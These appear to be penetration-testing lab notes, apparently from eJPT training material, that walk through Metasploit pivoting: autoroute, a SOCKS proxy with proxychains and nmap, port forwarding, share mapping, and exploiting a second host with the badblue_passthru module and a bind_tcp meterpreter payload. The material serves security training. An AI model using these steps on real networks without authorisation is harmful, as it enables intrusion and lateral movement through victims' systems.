
Run `autoroute` command for pivoting
```
meterpreter> run autoroute -s target/24
```


Background the session and search `socks`
```
search socks
use auxiliary/server/socks_proxy
show options
set version 4a
set srvport 9050
run -j
```


Now try to scan the IP using NMAP
```
proxychains nmap -sT -Pn -p445 -sV 10.5.25.118
```



Now time to access the file from the pivote system
```
net view <povite_target_system_ip>
net use D: \\target_ip\file_name

dir D:
```



Additional note:
## PIVOTING - IMPORTANT

**Meterpreter**
- setup msf with workspace
- db_nmap the victim 1
- use exploit to gain meterpreter session
- run ipconfig in meterpreter and gain the subnet network address
- `run autoroute -s <TARGET1_SUBNET_NETWORK with cidr>` *THIS IS ONLY APPLICABLE FOR MSFCONSOLE AND WON'T WORK WITH BROWSER i.e. targetIP:80 will not open in browser* *PORT-FORWARDING IS NEEDED*
- name the session victim 1 and put it in background
`use auxiliary/scanner/portscan/tcp`
`set RHOSTS <TARGET2_IP>`
`set PORTS 1-100`

**Port Forwarding**
`sessions 1`
`portfwd add -l <your LOCAL_PORT> -p <TARGET2_PORT> -r <TARGET2_IP>`
`background`
`db_nmap -sS -sV -p <your LOCAL_PORT> localhost`

**Target2 Exploitation**
`use exploit/windows/http/badblue_passthru`
`set payload windows/meterpreter/bind_tcp`
`set RHOSTS <TARGET2_IP>`
`set LPORT <LOCAL_PORT2>`
`run`

https://github.com/syselement/ine-notes/blob/main/ejpt/hostnetwork-penetration-testing/5-post-exploit/pivoting.md